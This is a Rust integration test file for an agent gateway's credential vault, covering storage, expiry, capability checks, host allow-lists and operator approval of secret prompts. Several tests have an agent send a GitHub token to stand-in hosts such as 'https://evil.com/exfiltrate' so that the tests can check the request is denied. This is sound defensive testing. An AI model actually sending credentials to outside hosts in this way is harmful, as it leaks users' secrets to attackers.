//! Integration tests for credential management.
//!
//! Run with:
//!   cargo test -p autonoetic-gateway --test credential_integration -- --nocapture
//!
//! Vault persistence requires `AUTONOETIC_VAULT_KEY` or `AUTONOETIC_VAULT_KEY_PATH` (see `vault.rs`).

use autonoetic_gateway::policy::PolicyEngine;
use autonoetic_gateway::runtime::tools::default_registry;
use autonoetic_gateway::scheduler::gateway_store::GatewayStore;
use autonoetic_types::agent::{AgentIdentity, AgentManifest, CredentialRecord, RuntimeDeclaration};
use autonoetic_types::capability::Capability;
use secrecy::ExposeSecret;
use serde::{Deserialize, Serialize};
use std::io::{Read, Write};
use std::net::TcpListener;
use std::sync::Arc;
use std::thread;
use tempfile::tempdir;

fn test_manifest(capabilities: Vec<Capability>) -> AgentManifest {
    AgentManifest {
        version: "1.0".to_string(),
        runtime: RuntimeDeclaration {
            engine: "autonoetic".to_string(),
            gateway_version: "0.1.0".to_string(),
            sdk_version: "0.1.0".to_string(),
            runtime_type: "stateful".to_string(),
            sandbox: "bubblewrap".to_string(),
            runtime_lock: "runtime.lock".to_string(),
        },
        agent: AgentIdentity {
            id: "test-agent".to_string(),
            name: "test-agent".to_string(),
            description: "test".to_string(),
        },
        capabilities,
        llm_config: None,
        limits: None,
        background: None,
        disclosure: None,
        io: None,
        middleware: None,
        execution_mode: Default::default(),
        script_entry: None,
        script_input_mode: Default::default(),
        gateway_url: None,
        gateway_token: None,
        response_contract: None,
        allowed_tool_tiers: vec![],
        agentskills_import: None,
        compression: None,
    }
}

fn spawn_one_shot_http_server(
    status: &str,
    content_type: &str,
    body: String,
) -> (String, thread::JoinHandle<()>) {
    let status = status.to_string();
    let content_type = content_type.to_string();
    let listener = TcpListener::bind("127.0.0.1:0").expect("listener should bind");
    let addr = listener
        .local_addr()
        .expect("listener should expose local addr");
    let handle = thread::spawn(move || {
        if let Ok((mut stream, _)) = listener.accept() {
            let mut request_buf = [0_u8; 2048];
            let _ = stream.read(&mut request_buf);
            let response = format!(
                "HTTP/1.1 {status}\r\nContent-Type: {content_type}\r\nContent-Length: {}\r\nConnection: close\r\n\r\n{}",
                body.len(),
                body
            );
            let _ = stream.write_all(response.as_bytes());
            let _ = stream.flush();
        }
    });
    (format!("http://{}", addr), handle)
}

fn setup_vault(_secret_name: &str, _secret_value: &str) -> tempfile::TempDir {
    let temp = tempdir().unwrap();
    let vault_path = temp.path().join("vault.enc.json");
    let key_hex = "000102030405060708090a0b0c0d0e0f101112131415161718191a1b1c1d1e1f";
    std::env::set_var("AUTONOETIC_VAULT_KEY", key_hex);
    std::env::set_var("AUTONOETIC_VAULT_PATH", &vault_path);
    temp
}

// ---------------------------------------------------------------------------
// Storage-level tests
// ---------------------------------------------------------------------------

#[test]
fn test_credential_crud() -> anyhow::Result<()> {
    let temp_dir = tempdir()?;
    let store = GatewayStore::open(temp_dir.path())?;

    let cred = CredentialRecord {
        credential_id: "cred_test_001".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: Some("coder.default".to_string()),
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec!["api.github.com".to_string()],
    };

    store.upsert_credential(&cred)?;

    let retrieved = store
        .get_credential("cred_test_001")?
        .expect("credential should exist");
    assert_eq!(retrieved.credential_id, cred.credential_id);
    assert_eq!(retrieved.service, "github");
    assert_eq!(retrieved.allowed_hosts, vec!["api.github.com"]);

    let listed = store.list_credentials_by_service("github")?;
    assert_eq!(listed.len(), 1);
    assert_eq!(listed[0].allowed_hosts, vec!["api.github.com"]);

    let deleted = store.delete_credential("cred_test_001")?;
    assert!(deleted);
    assert!(store.get_credential("cred_test_001")?.is_none());

    Ok(())
}

#[test]
fn test_credential_expiry_check() -> anyhow::Result<()> {
    let temp_dir = tempdir()?;
    let store = GatewayStore::open(temp_dir.path())?;

    let now = chrono::Utc::now();
    let expired = (now - chrono::Duration::hours(1)).to_rfc3339();
    let valid = (now + chrono::Duration::hours(24)).to_rfc3339();

    let cred_expired = CredentialRecord {
        credential_id: "cred_expired".to_string(),
        service: "stripe".to_string(),
        secret_name: "STRIPE_KEY".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: Some(expired),
        shared_with: vec![],
        allowed_hosts: vec![],
    };

    let cred_valid = CredentialRecord {
        credential_id: "cred_valid".to_string(),
        service: "stripe".to_string(),
        secret_name: "STRIPE_KEY2".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: Some(valid),
        shared_with: vec![],
        allowed_hosts: vec![],
    };

    store.upsert_credential(&cred_expired)?;
    store.upsert_credential(&cred_valid)?;

    let all = store.list_credentials_by_service("stripe")?;
    assert_eq!(all.len(), 2);

    Ok(())
}

#[test]
fn test_credential_expiry_parsing() -> anyhow::Result<()> {
    let temp_dir = tempdir()?;
    let store = GatewayStore::open(temp_dir.path())?;

    let now = chrono::Utc::now();
    let expired_ts = (now - chrono::Duration::hours(1)).to_rfc3339();

    let cred = CredentialRecord {
        credential_id: "cred_check".to_string(),
        service: "test".to_string(),
        secret_name: "TEST_KEY".to_string(),
        inject_as: None,
        created_by_agent: None,
        expires_at: Some(expired_ts),
        shared_with: vec![],
        allowed_hosts: vec![],
    };

    store.upsert_credential(&cred)?;
    let listed = store.list_credentials_by_service("test")?;
    assert_eq!(listed.len(), 1);

    let parsed = chrono::DateTime::parse_from_rfc3339(listed[0].expires_at.as_ref().unwrap());
    assert!(parsed.is_ok());
    assert!(parsed.unwrap() < chrono::Utc::now());

    Ok(())
}

// ---------------------------------------------------------------------------
// Tool-level security tests
// ---------------------------------------------------------------------------

#[test]
fn test_credential_check_available_with_credential_access() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let registry = default_registry();

    let defs = registry.available_definitions(&manifest);
    assert!(defs.iter().any(|d| d.name == "credential.check"));
}

#[test]
fn test_credential_check_denied_without_credential_access() {
    let manifest = test_manifest(vec![Capability::ReadAccess {
        scopes: vec!["*".to_string()],
    }]);
    let registry = default_registry();

    let defs = registry.available_definitions(&manifest);
    assert!(!defs.iter().any(|d| d.name == "credential.check"));
}

#[test]
#[ignore = "flaky due to process-wide AUTONOETIC_VAULT_PATH env race; run standalone"]
fn test_credential_check_service_scoped_denial() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential.check",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({ "service": "stripe" }).to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.check should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);
    assert_eq!(parsed["service"], "github");
}

#[test]
fn test_credential_request_denied_wrong_service() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let cred = CredentialRecord {
        credential_id: "cred_stripe_001".to_string(),
        service: "stripe".to_string(),
        secret_name: "STRIPE_KEY".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec!["api.stripe.com".to_string()],
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential.request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_stripe_001",
                "url": "https://api.stripe.com/v1/charges"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["error"]
        .as_str()
        .unwrap()
        .contains("Credential access denied for service: stripe"));
}

#[test]
fn test_credential_request_denied_host_not_in_allowed_hosts() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string(), "evil.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let cred = CredentialRecord {
        credential_id: "cred_github_001".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec!["api.github.com".to_string()],
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential.request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_github_001",
                "url": "https://evil.com/exfiltrate"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["error"]
        .as_str()
        .unwrap()
        .contains("is not authorized for host 'evil.com'"));
}

#[test]
#[ignore = "flaky due to process-wide AUTONOETIC_VAULT_PATH env race; run standalone"]
fn test_credential_request_allowed_when_host_matches() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (url, handle) = spawn_one_shot_http_server("200 OK", "text/plain", "ok".to_string());
    let host = url::Url::parse(&url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();

    let cred = CredentialRecord {
        credential_id: "cred_gh_local".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("header:X-Custom-Auth".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec![host.clone()],
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential.request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_gh_local",
                "url": format!("{}/api", url),
                "inject_secret_as": "bearer"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);

    handle.join().expect("server thread should join");
}

#[test]
#[ignore = "flaky due to process-wide AUTONOETIC_VAULT_PATH env race; run standalone"]
fn test_credential_request_stored_inject_as_takes_precedence() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (url, handle) = spawn_one_shot_http_server("200 OK", "text/plain", "ok".to_string());
    let host = url::Url::parse(&url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();

    let cred = CredentialRecord {
        credential_id: "cred_inject_precedence".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("header:X-Custom-Auth".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec![host.clone()],
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential.request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_inject_precedence",
                "url": format!("{}/api", url),
                "inject_secret_as": "bearer"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);

    handle.join().expect("server thread should join");
}

#[test]
#[ignore = "flaky due to process-wide AUTONOETIC_VAULT_PATH env race; run standalone"]
fn test_credential_request_no_allowed_hosts_uses_network_access_only() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (url, handle) = spawn_one_shot_http_server(
        "200 OK",
        "application/json",
        r#"{"status":"ok"}"#.to_string(),
    );
    let _host = url::Url::parse(&url)
        .unwrap()
        .host_str()
        .unwrap()
        .to_string();

    let cred = CredentialRecord {
        credential_id: "cred_no_host_binding".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec![],
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential.request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_no_host_binding",
                "url": format!("{}/api", url)
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);

    handle.join().expect("server thread should join");
}

#[test]
fn test_credential_request_denied_expired() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let expired_ts = (chrono::Utc::now() - chrono::Duration::hours(1)).to_rfc3339();

    let cred = CredentialRecord {
        credential_id: "cred_expired_001".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: Some(expired_ts),
        shared_with: vec![],
        allowed_hosts: vec!["127.0.0.1".to_string()],
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential.request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_expired_001",
                "url": "http://127.0.0.1:9999/api"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["error"]
        .as_str()
        .unwrap()
        .contains("Credential expired at"));
    assert_eq!(parsed["expired"], true);
}

#[test]
fn test_credential_request_denied_malformed_expiry() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let cred = CredentialRecord {
        credential_id: "cred_bad_expiry".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: Some("not-a-timestamp".to_string()),
        shared_with: vec![],
        allowed_hosts: vec!["127.0.0.1".to_string()],
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential.request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_bad_expiry",
                "url": "http://127.0.0.1:9999/api"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["error"]
        .as_str()
        .unwrap()
        .contains("unparseable expiry timestamp"));
    assert_eq!(parsed["expires_at_parse_error"], true);
}

#[test]
fn test_credential_request_denied_network_policy() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let cred = CredentialRecord {
        credential_id: "cred_net_denied".to_string(),
        service: "github".to_string(),
        secret_name: "GITHUB_TOKEN".to_string(),
        inject_as: Some("bearer".to_string()),
        created_by_agent: None,
        expires_at: None,
        shared_with: vec![],
        allowed_hosts: vec!["api.github.com".to_string(), "evil.com".to_string()],
    };
    store.upsert_credential(&cred).unwrap();

    let result = registry
        .execute(
            "credential.request",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "credential_id": "cred_net_denied",
                "url": "https://evil.com/exfil"
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.request should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["error"]
        .as_str()
        .unwrap()
        .contains("Network access denied for host: evil.com"));
}

#[test]
fn test_credential_setup_available_with_credential_access() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let registry = default_registry();

    let defs = registry.available_definitions(&manifest);
    assert!(defs.iter().any(|d| d.name == "credential.setup"));
}

#[test]
fn test_credential_setup_denied_without_credential_access() {
    let manifest = test_manifest(vec![Capability::ReadAccess {
        scopes: vec!["*".to_string()],
    }]);
    let registry = default_registry();

    let defs = registry.available_definitions(&manifest);
    assert!(!defs.iter().any(|d| d.name == "credential.setup"));
}

#[test]
fn test_credential_setup_denied_wrong_service() {
    let manifest = test_manifest(vec![Capability::CredentialAccess {
        services: vec!["github".to_string()],
    }]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential.setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "stripe",
                "steps": [{
                    "step_type": "user_action",
                    "instruction": "Go to stripe.com"
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["error"]
        .as_str()
        .unwrap()
        .contains("Credential setup denied for service: stripe"));
}

#[test]
fn test_credential_setup_denied_network_policy() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential.setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "api_call",
                    "method": "GET",
                    "url": "https://evil.com/oauth/token"
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert!(parsed["error"]
        .as_str()
        .unwrap()
        .contains("Network access denied for host: evil.com"));
}

#[test]
fn test_credential_setup_user_action_succeeds() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential.setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "user_action",
                    "instruction": "Visit github.com/settings/tokens to create a token"
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);
    assert_eq!(parsed["service"], "github");
    assert_eq!(parsed["secrets_stored"], 0);
}

#[test]
fn test_credential_setup_user_prompt_suspends_no_further_steps() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["api.github.com".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let result = registry
        .execute(
            "credential.setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [
                    {
                        "step_type": "user_action",
                        "instruction": "Go to github.com"
                    },
                    {
                        "step_type": "user_prompt",
                        "message": "Enter your token",
                        "secret_fields": [{"name": "token", "label": "GitHub Token", "masked": true}]
                    },
                    {
                        "step_type": "api_call",
                        "method": "GET",
                        "url": "https://api.github.com/user"
                    }
                ]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], false);
    assert_eq!(parsed["suspended"], true);
    assert_eq!(parsed["approval_required"], true);
    assert!(
        parsed["request_id"].as_str().is_some(),
        "request_id should be present"
    );
    let steps = parsed["steps"].as_array().expect("steps should be array");
    assert_eq!(steps.len(), 2);
    assert_eq!(steps[0]["step_type"], "user_action");
    assert_eq!(steps[1]["step_type"], "user_prompt");
    assert!(steps[1]["approval_request_id"].as_str().is_some());
}

#[test]
fn test_credential_setup_extract_public_blocks_overlapping_secret_path() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("GITHUB_TOKEN", "ghp_secret123");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    let (url, handle) = spawn_one_shot_http_server(
        "200 OK",
        "application/json",
        r#"{"token":"secret123","user":"alice"}"#.to_string(),
    );

    let result = registry
        .execute(
            "credential.setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "api_call",
                    "method": "POST",
                    "url": format!("{}/oauth/token", url),
                    "extract_secrets": {
                        "GITHUB_TOKEN": "token"
                    },
                    "extract_public": {
                        "leaked_token": "token",
                        "username": "user"
                    }
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(store),
            None,
        )
        .expect("credential.setup should succeed");

    let parsed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(parsed["ok"], true);
    let public_data = parsed["public_data"]
        .as_object()
        .expect("public_data should be object");
    assert!(public_data.contains_key("username"));
    assert!(!public_data.contains_key("leaked_token"));

    handle.join().expect("server thread should join");
}

#[test]
#[ignore = "flaky due to process-wide AUTONOETIC_VAULT_PATH env race; run standalone"]
fn test_credential_setup_user_prompt_full_lifecycle() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    // Step 1: Start credential.setup with a UserPrompt step
    let result = registry
        .execute(
            "credential.setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "user_prompt",
                    "message": "Enter your GitHub token",
                    "secret_fields": [
                        {"name": "GITHUB_TOKEN", "label": "GitHub Token", "masked": true}
                    ]
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential.setup should succeed");

    let suspended: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(suspended["ok"], false);
    assert_eq!(suspended["suspended"], true);
    assert_eq!(suspended["approval_required"], true);
    let request_id = suspended["request_id"]
        .as_str()
        .expect("request_id should be present");

    // Step 2: Approve the request with secrets (simulating operator action)
    autonoetic_gateway::scheduler::approve_request(
        &autonoetic_types::config::GatewayConfig::default(),
        Some(&store),
        request_id,
        "test",
        None,
        Some(vec![(
            "GITHUB_TOKEN".to_string(),
            "ghp_test_token_123".to_string(),
        )]),
        None,
        None,
    )
    .expect("approval should succeed");

    // Step 3: Verify the credential record was created
    let creds = store
        .list_credentials_by_service("github")
        .expect("list creds");
    assert_eq!(creds.len(), 1);
    assert_eq!(creds[0].service, "github");
    assert_eq!(creds[0].secret_name, "GITHUB_TOKEN");

    // Step 4: Retry credential.setup with approval_ref
    let result = registry
        .execute(
            "credential.setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "user_prompt",
                    "message": "Enter your GitHub token",
                    "secret_fields": [
                        {"name": "GITHUB_TOKEN", "label": "GitHub Token", "masked": true}
                    ]
                }],
                "approval_ref": request_id
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential.setup should succeed");

    let resumed: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    assert_eq!(resumed["ok"], true);
    assert_eq!(resumed["resumed_from_approval"], true);
    assert_eq!(resumed["credential_id"], creds[0].credential_id);

    // Step 5: Verify the secret is in the vault
    let vault_path = std::env::var("AUTONOETIC_VAULT_PATH").unwrap();
    let vault = autonoetic_gateway::vault::Vault::load_from_file(std::path::Path::new(&vault_path))
        .expect("load vault");
    assert_eq!(
        vault
            .get_secret("GITHUB_TOKEN")
            .expect("secret exists")
            .expose_secret(),
        "ghp_test_token_123"
    );
}

#[test]
#[ignore = "flaky due to process-wide AUTONOETIC_VAULT_PATH env race; run standalone"]
fn test_credential_setup_approval_fails_with_missing_secrets() {
    let manifest = test_manifest(vec![
        Capability::CredentialAccess {
            services: vec!["github".to_string()],
        },
        Capability::NetworkAccess {
            hosts: vec!["127.0.0.1".to_string()],
        },
    ]);
    let policy = PolicyEngine::new(manifest.clone());
    let registry = default_registry();

    let _vault_temp = setup_vault("DUMMY", "dummy");
    let temp = tempdir().unwrap();
    let store = Arc::new(GatewayStore::open(temp.path()).unwrap());

    // Start credential.setup with a UserPrompt step
    let result = registry
        .execute(
            "credential.setup",
            &manifest,
            &policy,
            temp.path(),
            None,
            &serde_json::json!({
                "service": "github",
                "steps": [{
                    "step_type": "user_prompt",
                    "message": "Enter your GitHub token",
                    "secret_fields": [
                        {"name": "GITHUB_TOKEN", "label": "GitHub Token", "masked": true},
                        {"name": "GITHUB_USER", "label": "GitHub User", "masked": false}
                    ]
                }]
            })
            .to_string(),
            None,
            None,
            None,
            Some(Arc::clone(&store)),
            None,
        )
        .expect("credential.setup should succeed");

    let suspended: serde_json::Value = serde_json::from_str(&result).expect("valid json");
    let request_id = suspended["request_id"]
        .as_str()
        .expect("request_id should be present");

    // Approve with only one of two required secrets — should fail
    let approval_result = autonoetic_gateway::scheduler::approve_request(
        &autonoetic_types::config::GatewayConfig::default(),
        Some(&store),
        request_id,
        "test",
        None,
        Some(vec![("GITHUB_TOKEN".to_string(), "ghp_test".to_string())]),
        None,
        None,
    );
    assert!(approval_result.is_err());
    assert!(approval_result
        .unwrap_err()
        .to_string()
        .contains("Missing required secret fields"));
}

#[test]
fn test_credential_setup_json_path_dollar_prefix() {
    let _value: serde_json::Value = serde_json::json!({
        "data": {
            "token": "secret123",
            "user": "alice"
        }
    });

    let result = autonoetic_gateway::runtime::store::parse_json_path("$.data.token");
    assert_eq!(result, vec!["data", "token"]);

    let result = autonoetic_gateway::runtime::store::parse_json_path("data.token");
    assert_eq!(result, vec!["data", "token"]);

    let result = autonoetic_gateway::runtime::store::parse_json_path("$.user");
    assert_eq!(result, vec!["user"]);
}
